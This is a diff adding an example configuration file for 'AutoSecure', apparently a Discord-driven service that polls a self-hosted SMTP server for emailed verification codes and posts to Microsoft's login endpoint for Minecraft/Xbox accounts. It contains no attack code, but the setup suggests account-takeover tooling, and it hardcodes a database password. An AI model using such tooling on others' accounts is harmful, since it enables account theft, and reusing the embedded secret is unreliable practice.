@@ -1,0 +1,128 @@
+# AutoSecure Configuration
+# Copy to config.yaml and fill in your values
+
+# Discord Bot Configuration
+discord:
+  tokens:
+    - ""                    # Controller bot token
+  guild_id: ""
+  owner_role: ""
+  member_role: ""
+  role_id: ""
+  welcome_channel: ""
+  leaderboard_channel: ""
+  log_channel: ""
+  notifier_channel: ""
+  transcript_channel: ""
+  ticket_category: ""
+  notifier_webhook: ""
+  webhook_url: ""
+
+# Owner Discord IDs
+owners:
+  - ""
+
+# Domain Configuration
+domains:
+  - "autosecure.me"
+domain: "autosecure.me"
+
+# License Configuration
+license:
+  trial_duration: "8h"
+  jwt_secret: ""           # Set in .env
+  auth_key: ""             # Set in .env
+  captcha_key: ""          # Set in .env
+
+# API Configuration
+api:
+  port: 8000
+  host: "127.0.0.1"
+  workers: 3
+  cors_origins:
+    - "http://localhost:3000"
+  rate_limit:
+    default: 30
+    window: 60
+
+# SMTP Configuration
+smtp:
+  host: "0.0.0.0"
+  port: 25
+
+# Database Configuration
+database:
+  url: "postgresql+asyncpg://autosecure:aUt0S3cur3DB!2026@localhost:5432/autosecure"
+  pool_size: 20
+  max_overflow: 10
+  echo: false
+
+# Redis Configuration
+redis:
+  url: "redis://localhost:6379/0"
+  cache_ttl: 300           # 5 minutes default cache TTL
+
+# Security Configuration
+security:
+  encryption_key: ""       # Set in .env (Fernet key)
+  jwt_secret: ""           # Set in .env
+  jwt_algorithm: "HS256"
+  jwt_access_expiry: 900   # 15 minutes
+  jwt_refresh_expiry: 604800  # 7 days
+  session_secret: ""       # Set in .env
+
+# Microsoft Configuration
+microsoft:
+  auth_url: "https://login.live.com/ppsecure/post.srf"
+  redirect_uri: "https://www.xbox.com/auth/msa/blank.html"
+
+# External APIs
+apis:
+  donutsmp: "https://api.donutsmp.net"
+  mctiers: "https://mctiers.com/api"
+  hypixel: "https://api.hypixel.net"
+  mc_head: "https://mc-heads.net"
+  visage: "https://visage.surgeplay.com"
+
+# HTTP Client Configuration
+http:
+  timeout: 10
+  max_retries: 3
+  user_agents:
+    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
+    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0"
+    - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
+
+# Task Intervals (milliseconds)
+tasks:
+  license_check: 10000       # 10s
+  invoice_check: 60000       # 60s
+  leaderboard_update: 300000 # 5min
+  quarantine_check: 60000    # 60s
+  quarantine_expiry: 86400000 # 24h
+  notification_poll: 30000   # 30min
+  role_sync: 1800000         # 30min
+  autoclean: 3600000         # 1h
+
+# Email Configuration
+email:
+  code_length: [6, 7]
+  poll_interval: 1000       # 1s
+  watch_timeout: 30000      # 30s
+  max_checks: 10
+  blocked_emails: []
+  ignore_emails: []
+
+# UI Configuration
+ui:
+  default_pfp: ""
+  thumbnail_url: "https://cdn.discordapp.com/attachments/1460894741431451676/1462041018022236301/standard_12.gif"
+  banner_url: ""
+  footer_text: "AutoSecure"
+  footer_icon: ""
+
+# Logging
+logging:
+  level: "INFO"
+  json_format: true
+  file: "logs/autosecure.log"
